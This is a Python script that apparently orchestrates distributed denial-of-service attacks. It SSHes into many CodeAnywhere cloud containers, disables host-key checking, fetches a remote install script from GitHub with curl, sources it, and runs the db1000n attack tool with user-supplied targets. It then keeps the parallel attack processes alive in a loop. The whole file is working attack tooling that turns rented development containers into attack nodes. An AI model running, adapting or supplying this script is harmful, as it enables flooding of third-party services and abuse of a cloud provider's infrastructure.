"""
attacks with needles via codeanywhere

"""

import argparse
import logging
import os
import shlex
import subprocess
import sys
import time

from utils.caw_restart import restart

MSG_FORMAT = '%(asctime)s:%(levelname)s: %(message)s'

logging.getLogger().setLevel(logging.INFO)
logging.basicConfig(format=MSG_FORMAT)

CAW_KEYS_DIR = f'caw_keys{os.sep}'

ATTACK_COMMAND = (
    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
    '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
    '&& ./db1000n -enable-self-update -prometheus_on=false {needles_args}"'
)


class Attack:
    """
    class to attack with needles via codeanywhere

    """

    def __init__(self):
        self.configurations = []
        self.shells_num = 0
        self.iter_configurations = iter([])
        self.processes = []

    def make_hosts(self, shells_num):
        """
        makes list of hosts

        :param shells_num: a number of ssh connections

        """
        self.configurations = next(os.walk(CAW_KEYS_DIR))[-1]

        if self.configurations:
            logging.info('codeanywhere hosts: %s', ", ".join(self.configurations))
            self.shells_num = min(len(self.configurations), shells_num)
            self.iter_configurations = iter(self.configurations)
        else:
            logging.warning('there is no codeanywhere host')

    def make_process(self, needles_args):
        """
        makes process with ssh connect and runs command

        :param needles_args: db1000n arguments

        """
        configuration = next(self.iter_configurations, None)

        if configuration is None and self.configurations:
            self.iter_configurations = iter(self.configurations)

        if configuration:
            os.makedirs('logs', exist_ok=True)
            email, host, port = configuration.split('__')

            try:
                restart(email, os.environ['CAW_PASSWORD'])
            except Exception as e:
                logging.error('container was not restarted: %s', e)

            with open(f'logs{os.sep}caw__{configuration}.log', 'w') as log:
                process = subprocess.Popen(
                    shlex.split(ATTACK_COMMAND.format(
                        caw_keys_dir=CAW_KEYS_DIR,
                        email=email,
                        host=host,
                        port=port,
                        needles_args=needles_args
                    )),
                    stdout=log,
                    stderr=log
                )
                logging.info(
                    'codeanywhere host %s: attack started, pid %d',
                    host,
                    process.pid
                )
                self.processes.append(process)

    def start(self, needles_args):
        """
        starts attack with needles via codeanywhere

        :param needles_args: db1000n arguments

        """
        for _ in range(self.shells_num):
            self.make_process(needles_args)

        while self.processes:
            for process in self.processes:
                code = process.poll()

                if code is not None:
                    self.processes.remove(process)
                    logging.info('attack finished, pid %d, return code: %d', process.pid, code)

                if len(self.processes) < self.shells_num:
                    self.make_process(needles_args)

            time.sleep(5.)


def main():
    """
    attacks with needles via codeanywhere

    """
    parser = argparse.ArgumentParser(
        description='auto-attack with needles via codeanywhere in parallel',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--shells_num', type=int, default=7, help='number of ssh connections')
    parser.add_argument('--needles_args', type=str, default='', help='db1000n arguments')
    args = parser.parse_args()

    attack = Attack()

    try:
        logging.info('press ctrl+c to stop attack')
        while True:
            attack.make_hosts(args.shells_num)

            if not attack.configurations:
                sys.exit()

            attack.start(args.needles_args)

    except KeyboardInterrupt:
        for process in attack.processes:
            process.terminate()

        logging.info('attack interrupted')
        sys.exit()


if __name__ == '__main__':
    main()
